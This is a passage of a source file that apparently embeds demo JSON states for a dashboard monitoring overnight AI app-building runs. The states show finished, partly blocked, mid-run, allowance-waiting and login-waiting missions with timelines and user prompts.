+<script type="application/json" id="mc-demo">{"done":{"schemaVersion":1,"generatedAt":1791713010000,"generatedAtText":"10:03:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"on_track","word":"On track","sentence":"All 4 features are done. Nothing needs you.","reasons":[{"code":"all_done","severity":"ok","text":"everything is done","missionId":null,"featureId":null}]},"run":{"active":false,"heartbeat":"none","startedAt":null,"startedAtText":null,"runningMs":null,"runningText":null,"heartbeatAgeMs":null,"heartbeatText":null,"stopRequested":false,"lastActivityAt":null,"lastActivityText":null,"deadline":null,"line":"No run is working right now.","activityLine":null},"now":null,"missions":[{"id":"2026-10-11-habit-tracker","title":"Habit tracker","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"done","word":"Done","sentence":"All 4 features are built and checked.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"done"},{"id":"final_check","word":"Final check","state":"done"},{"id":"landed","word":"Landed","state":"done"}],"progressWord":"Landed","repairLap":false,"featuresDone":4,"featuresTotal":4,"featuresLine":"4 of 4 features done","waiting":null,"features":[{"id":"add-habit","title":"Add and name a habit","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Add and name a habit\" in Habit tracker: \u003cyour answer here>"},{"id":"daily-checkin","title":"Daily check-in","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Daily check-in\" in Habit tracker: \u003cyour answer here>"},{"id":"streak-count","title":"Streak counter","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Streak counter\" in Habit tracker: \u003cyour answer here>"},{"id":"weekly-chart","title":"Weekly streak chart","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Weekly streak chart\" in Habit tracker: \u003cyour answer here>"}],"updatedAt":1791712693376,"tellLeader":"About \"Habit tracker\": \u003cyour answer here>"}],"needsYou":[],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null}],"waiting":null,"fileChangedAt":null,"fileChangedText":null},"timeline":{"items":[{"at":1791712689053,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"info","text":"Started working on “Habit tracker”.","note":null,"author":"engine","count":1},{"at":1791712689101,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"info","text":"The plan is ready: 4 features.","note":null,"author":"engine","count":1},{"at":1791712689392,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712690212,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"add-habit","tone":"good","text":"“Add and name a habit” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712691051,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"daily-checkin","tone":"good","text":"“Daily check-in” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712691992,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"streak-count","tone":"good","text":"“Streak counter” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712692918,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"weekly-chart","tone":"good","text":"“Weekly streak chart” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712692939,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"info","text":"The building is finished. Starting the final check.","note":null,"author":"engine","count":1},{"at":1791712693207,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"good","text":"The final tests of the whole app passed.","note":null,"author":"engine","count":1},{"at":1791712693376,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"good","text":"Finished “Habit tracker”: done.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":{"verdict":{"id":"done","word":"Done","sentence":"All 4 features are built and checked."},"missions":[{"missionId":"2026-10-11-habit-tracker","title":"Habit tracker","verdict":{"id":"done","word":"Done","sentence":"All 4 features are built and checked."},"plannedLine":"4 features planned","got":[{"featureId":"add-habit","title":"Add and name a habit","note":{"text":"As a user I can add a habit with a name.","author":"ai"},"attempts":1},{"featureId":"daily-checkin","title":"Daily check-in","note":{"text":"As a user I can tick a habit off for today.","author":"ai"},"attempts":1},{"featureId":"streak-count","title":"Streak counter","note":{"text":"As a user I see my current streak.","author":"ai"},"attempts":1},{"featureId":"weekly-chart","title":"Weekly streak chart","note":{"text":"As a user I see a chart of my week.","author":"ai"},"attempts":1}],"leftOut":[],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"yes","why":"All 4 features were built and checked.","caveat":null},{"id":"final_review","label":"Final review passed","state":"yes","why":"The final review ran and found no serious problem.","caveat":null},{"id":"nothing_open","label":"Nothing open","state":"yes","why":"Nothing is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":21,"tellLeader":"About \"Habit tracker\": \u003cyour answer here>"}],"allowanceNote":"The AI work runs on your existing Claude and Codex plans, so there is no separate bill. This page cannot show your share of the week yet.","honestyNote":"These are the AI team's own checks, not a human review."},"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":4,"featuresTotal":4,"featuresLine":"4 of 4 features done","questions":0,"stuckFeatures":0,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"partial-blocked":{"schemaVersion":1,"generatedAt":1791713010000,"generatedAtText":"10:03:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"needs_look","word":"Needs a look","sentence":"1 feature is stuck.","reasons":[{"code":"feature_stuck","severity":"look","text":"1 feature is stuck","missionId":null,"featureId":null}]},"run":{"active":false,"heartbeat":"none","startedAt":null,"startedAtText":null,"runningMs":null,"runningText":null,"heartbeatAgeMs":null,"heartbeatText":null,"stopRequested":false,"lastActivityAt":null,"lastActivityText":null,"deadline":null,"line":"No run is working right now.","activityLine":null},"now":null,"missions":[{"id":"2026-10-11-members-site","title":"Members site","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"partly_done","word":"Partly done","sentence":"2 of 4 features are built and checked. 1 feature is stuck. 1 feature was left out.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"done"},{"id":"final_check","word":"Final check","state":"done"},{"id":"landed","word":"Landed","state":"done"}],"progressWord":"Landed","repairLap":false,"featuresDone":2,"featuresTotal":4,"featuresLine":"2 of 4 features done","waiting":null,"features":[{"id":"signup","title":"Sign-up page","state":"stuck","word":"Stuck","reason":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"steps":{"used":3,"total":5,"caption":"Tried 3 times (2 build tries and 1 expert diagnosis)"},"reinforcements":2,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":"feature_stuck:2026-10-11-members-site:signup","tellLeader":"About \"Sign-up page\" in Members site: \u003cyour answer here>"},{"id":"pay-subscription","title":"Paid subscription","state":"left_out","word":"Left out","reason":{"text":"It needed “Sign-up page”, which is stuck.","author":"engine"},"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Paid subscription\" in Members site: \u003cyour answer here>"},{"id":"welcome-email","title":"Welcome email","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Welcome email\" in Members site: \u003cyour answer here>"},{"id":"settings","title":"Settings page","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Settings page\" in Members site: \u003cyour answer here>"}],"updatedAt":1791712697573,"tellLeader":"About \"Members site\": \u003cyour answer here>"}],"needsYou":[{"id":"feature_stuck:2026-10-11-members-site:signup","kind":"feature_stuck","severity":"look","missionId":"2026-10-11-members-site","missionTitle":"Members site","fromBefore":false,"featureId":"signup","title":"“Sign-up page” is stuck","happened":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"summary":"Tried 3 times (2 build tries and 1 expert diagnosis).","ifNothing":"It stays out. Nothing tries it again unless you ask. “Paid subscription” needed it, so that stays out too.","tellLeader":"About \"Sign-up page\" in Members site, which is stuck: \u003cyour answer here>"}],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null}],"waiting":null,"fileChangedAt":null,"fileChangedText":null},"timeline":{"items":[{"at":1791712694163,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"info","text":"Started working on “Members site”.","note":null,"author":"engine","count":1},{"at":1791712694172,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"info","text":"The plan is ready: 4 features.","note":null,"author":"engine","count":1},{"at":1791712694423,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712694973,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"signup","tone":"warn","text":"“Sign-up page” did not pass its checks. Calling in reinforcements (step 2 of 5).","note":null,"author":"engine","count":1},{"at":1791712695214,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"signup","tone":"warn","text":"“Sign-up page” did not pass its checks. Calling in reinforcements (step 3 of 5).","note":null,"author":"engine","count":1},{"at":1791712695275,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"signup","tone":"bad","text":"“Sign-up page” is stuck.","note":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"author":"ai","count":1},{"at":1791712695278,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"pay-subscription","tone":"warn","text":"“Paid subscription” was left out because it needed a stuck feature.","note":null,"author":"engine","count":1},{"at":1791712696223,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"welcome-email","tone":"good","text":"“Welcome email” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712697188,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"settings","tone":"good","text":"“Settings page” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712697212,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"info","text":"The building is finished. Starting the final check.","note":null,"author":"engine","count":1},{"at":1791712697449,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"good","text":"The final tests of the whole app passed.","note":null,"author":"engine","count":1},{"at":1791712697573,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"warn","text":"Finished “Members site”: partly done.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":{"verdict":{"id":"partly_done","word":"Partly done","sentence":"2 of 4 features are built and checked. 1 feature is stuck."},"missions":[{"missionId":"2026-10-11-members-site","title":"Members site","verdict":{"id":"partly_done","word":"Partly done","sentence":"2 of 4 features are built and checked. 1 feature is stuck."},"plannedLine":"4 features planned","got":[{"featureId":"welcome-email","title":"Welcome email","note":{"text":"As a new user I get a welcome email.","author":"ai"},"attempts":1},{"featureId":"settings","title":"Settings page","note":{"text":"As a user I can change my name.","author":"ai"},"attempts":1}],"leftOut":[{"featureId":"signup","title":"Sign-up page","note":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"attempts":3},{"featureId":"pay-subscription","title":"Paid subscription","note":{"text":"It needed “Sign-up page”, which is stuck.","author":"engine"},"attempts":0}],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"no","why":"2 of 4 features were built and checked. 1 is stuck. 1 was left out.","caveat":null},{"id":"final_review","label":"Final review passed","state":"yes","why":"The final review ran and found no serious problem.","caveat":"It covered only the 2 features that were built."},{"id":"nothing_open","label":"Nothing open","state":"no","why":"1 item is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":20,"tellLeader":"About \"Members site\": \u003cyour answer here>"}],"allowanceNote":"The AI work runs on your existing Claude and Codex plans, so there is no separate bill. This page cannot show your share of the week yet.","honestyNote":"These are the AI team's own checks, not a human review."},"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":2,"featuresTotal":4,"featuresLine":"2 of 4 features done","questions":0,"stuckFeatures":1,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"working-midrun":{"schemaVersion":1,"generatedAt":1791712710000,"generatedAtText":"09:58:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"on_track","word":"On track","sentence":"1 of 3 features done. No problems so far. Nothing needs you.","reasons":[{"code":"working","severity":"ok","text":"the run is working and nothing needs a look","missionId":null,"featureId":null}]},"run":{"active":true,"heartbeat":"fresh","startedAt":1791712699844,"startedAtText":"09:58","runningMs":10156,"runningText":"10 s","heartbeatAgeMs":15000,"heartbeatText":"15 s ago","stopRequested":false,"lastActivityAt":1791712702910,"lastActivityText":"7 s ago","deadline":null,"line":"Task board (new app), running 10 s","activityLine":"Last activity 7 s ago"},"now":{"kind":"agent","text":"A second AI is reviewing “Add a task”","missionId":"2026-10-11-task-board","featureId":"add-task","since":1791712702910,"sinceText":"7 s so far","exact":true},"missions":[{"id":"2026-10-11-task-board","title":"Task board","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"working","word":"Working","sentence":"Building feature 2 of 3.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"current"},{"id":"final_check","word":"Final check","state":"todo"},{"id":"landed","word":"Landed","state":"todo"}],"progressWord":"Build","repairLap":false,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","waiting":null,"features":[{"id":"list-tasks","title":"Task list","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Task list\" in Task board: \u003cyour answer here>"},{"id":"add-task","title":"Add a task","state":"being_reviewed","word":"Being reviewed","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Add a task\" in Task board: \u003cyour answer here>"},{"id":"done-task","title":"Mark a task done","state":"waiting_turn","word":"Waiting its turn","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Mark a task done\" in Task board: \u003cyour answer here>"}],"updatedAt":1791712702872,"tellLeader":"About \"Task board\": \u003cyour answer here>"}],"needsYou":[],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null}],"waiting":null,"fileChangedAt":null,"fileChangedText":null},"timeline":{"items":[{"at":1791712699847,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"info","text":"Started working on “Task board”.","note":null,"author":"engine","count":1},{"at":1791712699853,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"info","text":"The plan is ready: 3 features.","note":null,"author":"engine","count":1},{"at":1791712700124,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712700991,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":"list-tasks","tone":"good","text":"“Task list” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712702872,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":"add-task","tone":"info","text":"“Add a task” is built. A second AI is reviewing it.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":null,"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","questions":0,"stuckFeatures":0,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"waiting-long":{"schemaVersion":1,"generatedAt":1791712710000,"generatedAtText":"09:58:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"needs_look","word":"Needs a look","sentence":"Waiting for allowance until 12:59.","reasons":[{"code":"long_wait","severity":"look","text":"waiting for allowance until 12:59","missionId":"2026-10-11-reader","featureId":null}]},"run":{"active":true,"heartbeat":"fresh","startedAt":1791712705597,"startedAtText":"09:58","runningMs":4403,"runningText":"4 s","heartbeatAgeMs":15000,"heartbeatText":"15 s ago","stopRequested":false,"lastActivityAt":1791712705596,"lastActivityText":"4 s ago","deadline":null,"line":"Reader (new app), running 4 s","activityLine":"Last activity 4 s ago"},"now":{"kind":"waiting","text":"Waiting for allowance until 12:59. It resumes by itself.","missionId":"2026-10-11-reader","featureId":null,"since":null,"sinceText":null,"exact":true},"missions":[{"id":"2026-10-11-reader","title":"Reader","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"waiting","word":"Waiting","sentence":"Waiting for allowance until 12:59. It resumes by itself.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"current"},{"id":"build","word":"Build","state":"todo"},{"id":"final_check","word":"Final check","state":"todo"},{"id":"landed","word":"Landed","state":"todo"}],"progressWord":"Plan check","repairLap":false,"featuresDone":0,"featuresTotal":2,"featuresLine":"0 of 2 features done","waiting":{"until":1791723550596,"untilText":"12:59","cause":"limits","text":"Waiting for allowance until 12:59. It resumes by itself."},"features":[{"id":"feed","title":"News feed","state":"waiting_turn","word":"Waiting its turn","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"News feed\" in Reader: \u003cyour answer here>"},{"id":"bookmark","title":"Bookmarks","state":"waiting_turn","word":"Waiting its turn","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Bookmarks\" in Reader: \u003cyour answer here>"}],"updatedAt":1791712705596,"tellLeader":"About \"Reader\": \u003cyour answer here>"}],"needsYou":[],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"waiting_reset","word":"Waiting for reset"},"windows":[],"note":"No usage reading yet.","limitedUntil":1791723505596,"limitedText":"Waiting for the 5-hour limit to reset. Work resumes at 12:59."}],"waiting":{"until":1791723550596,"untilText":"12:59","cause":"limits","text":"Waiting for allowance until 12:59. It resumes by itself."},"fileChangedAt":1791712680000,"fileChangedText":"Usage figures last changed at 09:58"},"timeline":{"items":[{"at":1791712705596,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"info","text":"Started working on “Reader”.","note":null,"author":"engine","count":1},{"at":1791712705596,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"info","text":"The plan is ready: 2 features.","note":null,"author":"engine","count":1},{"at":1791712705596,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"warn","text":"Waiting for allowance until 12:59. It resumes by itself.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":null,"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":0,"featuresTotal":2,"featuresLine":"0 of 2 features done","questions":0,"stuckFeatures":0,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"login-wait":{"schemaVersion":1,"generatedAt":1791712710000,"generatedAtText":"09:58:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"needs_look","word":"Needs a look","sentence":"One AI needs a new login.","reasons":[{"code":"login_needed","severity":"look","text":"one AI needs a new login","missionId":"2026-10-11-photo-album","featureId":null}]},"run":{"active":true,"heartbeat":"fresh","startedAt":1791712680000,"startedAtText":"09:58","runningMs":30000,"runningText":"30 s","heartbeatAgeMs":15000,"heartbeatText":"15 s ago","stopRequested":false,"lastActivityAt":1791712698000,"lastActivityText":"12 s ago","deadline":null,"line":"Photo album (new app), running 30 s","activityLine":"Last activity 12 s ago"},"now":{"kind":"waiting","text":"Waiting for allowance until 12:59. Claude also needs a new login.","missionId":"2026-10-11-photo-album","featureId":null,"since":null,"sinceText":null,"exact":true},"missions":[{"id":"2026-10-11-photo-album","title":"Photo album","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"waiting","word":"Waiting","sentence":"Waiting for allowance until 12:59. Claude also needs a new login.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"current"},{"id":"final_check","word":"Final check","state":"todo"},{"id":"landed","word":"Landed","state":"todo"}],"progressWord":"Build","repairLap":false,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","waiting":{"until":1791723550000,"untilText":"12:59","cause":"login","text":"Waiting for allowance until 12:59. Claude also needs a new login."},"features":[{"id":"upload","title":"Upload photos","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Upload photos\" in Photo album: \u003cyour answer here>"},{"id":"albums","title":"Albums","state":"being_built","word":"Being built","reason":{"text":"On hold until 12:59, waiting for allowance.","author":"engine"},"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Albums\" in Photo album: \u003cyour answer here>"},{"id":"share","title":"Share an album","state":"waiting_turn","word":"Waiting its turn","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Share an album\" in Photo album: \u003cyour answer here>"}],"updatedAt":1791712698000,"tellLeader":"About \"Photo album\": \u003cyour answer here>"}],"needsYou":[{"id":"login_needed:2026-10-11-photo-album:0","kind":"login_needed","severity":"look","missionId":"2026-10-11-photo-album","missionTitle":"Photo album","fromBefore":false,"featureId":null,"title":"One AI needs a new login","happened":{"text":"Claude needs a new login on the PC. The run is asleep until 12:59 and then carries on with the other AI.","author":"engine"},"summary":null,"ifNothing":"The run carries on with the other AI when it can. If both need a login, the mission stops and needs your help.","tellLeader":"About the login that expired during \"Photo album\": \u003cyour answer here>"}],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null}],"waiting":{"until":1791723550000,"untilText":"12:59","cause":"login","text":"Waiting for allowance until 12:59. 